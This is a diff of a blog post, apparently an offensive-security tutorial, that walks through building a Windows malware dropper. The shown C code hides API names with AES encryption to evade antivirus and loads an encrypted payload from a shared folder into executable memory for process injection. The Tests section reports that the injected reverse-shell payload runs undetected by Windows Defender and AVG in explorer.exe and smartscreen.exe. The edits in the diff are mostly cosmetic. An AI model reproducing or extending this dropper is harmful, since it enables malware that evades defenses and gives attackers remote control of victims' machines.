@@ -60,7 +60,7 @@ xxd -g1 payload_enc
 Now we must mount the folder where the payload is, in the target OS as a shared folder. 
 
 ## the Dropper
-As for the previous post the only thing to change is the way the payload is loaded in memory. 
+As for the previous post the main thing to change is the way the payload is loaded in memory. 
 
 ```c
   // Load resources section
@@ -83,15 +83,14 @@ As for the previous post the only thing to change is the way the payload is load
   // Copy p0 to new memory buffer
   pRtlMoveMemory(exec_mem, p0, p0_len);
 ```
-
-In the code trunk below the Windows functions are called as pointers because of AES encryption as saw in the previous post, this techniques works very well as an AV evasion technique so we can reuse it. Now we have to change this section like this
+In the code trunk below the Windows functions are called as pointers because of AES encryption as saw in the previous post, this techniques works very well as an AV evasion technique so we can reuse it. Now we have to change the dropper like this
 
 ```c
   //Define the BUFFSIZE
   #define BUFFSIZE 512
 
   ...
-  // Define the pointer to the kernel32.dll File manipuulation functions
+  // Define the pointer to the kernel32.dll file manipuulation functions
   HANDLE (WINAPI * pCreateFileA)(
     LPCSTR                lpFileName,
     DWORD                 dwDesiredAccess,
@@ -116,12 +115,13 @@ In the code trunk below the Windows functions are called as pointers because of 
   unsigned char sReadFile[] = { ... };
   ...
 
-  // Decrypt the strings
+  // Decrypt the strings when needed
   AESDecrypt((char *) sCreateFileA, sizeof(sCreateFileA), key, sizeof(key));
   AESDecrypt((char *) sReadFile, sizeof(sReadFile), key, sizeof(key));
   ...
 
-  // Define the path where payload is stored (remember the double backslashes to avoid the escaping characters)
+  // Define the path where payload is stored 
+  // (remember the double backslashes to avoid the escaping characters)
   // the file HANDLE and the payload buffer size
   HANDLE hFile;
   char path[] = "\\\\tsclient\\share\\payload_enc";
@@ -134,7 +134,13 @@ In the code trunk below the Windows functions are called as pointers because of 
   ...
 
   // Load the payload from FS to memory
-  hFile = pCreateFileA(path, GENERIC_READ,FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
+  hFile = pCreateFileA(path, 
+                      GENERIC_READ,
+                      FILE_SHARE_READ, 
+                      NULL, 
+                      OPEN_EXISTING, 
+                      FILE_ATTRIBUTE_NORMAL, 
+                      NULL);
   
   if (hFile == INVALID_HANDLE_VALUE) {
     return 0;
@@ -155,7 +161,7 @@ In the code trunk below the Windows functions are called as pointers because of 
   // Copy payload to new memory buffer
   pRtlMoveMemory(exec_mem, payload, payload_len);
 ```
-After opening the file with ```CreateFileA``` function we need to read it with the ```ReadFile``` function, this function load the payload as binary stream in the ```payload``` pointer in memory. What we must do now is to calculate the payload lenght and move the payload to another RW memory buffer. After that we are ready to decrypt our payload and inject it in our PE target process.
+After opening the file with ```CreateFileA``` function we need to read it with ```ReadFile```, this function load the payload as binary stream in the ```payload``` pointer in memory. What we must do now is to calculate the payload lenght and move the payload to another RW memory buffer. After that we are ready to decrypt our payload and inject it in our PE target process.
 
 ## Tests
 As in the previous post we tested the dropper on different process: ```explorer.exe```, ```notepad.exe``` and ```smartscreen.exe``` but in this case  the injection doesn't trigger Windows Defender nor AVG Free "only" on ```explorer.exe``` and ```smartscreen.exe```, AVG scan the dropper and let it execute the reverse shell payload maintaining the shell active. So, also in this case, we are following the TOON rule (Two is One and One is None) also in this case.  
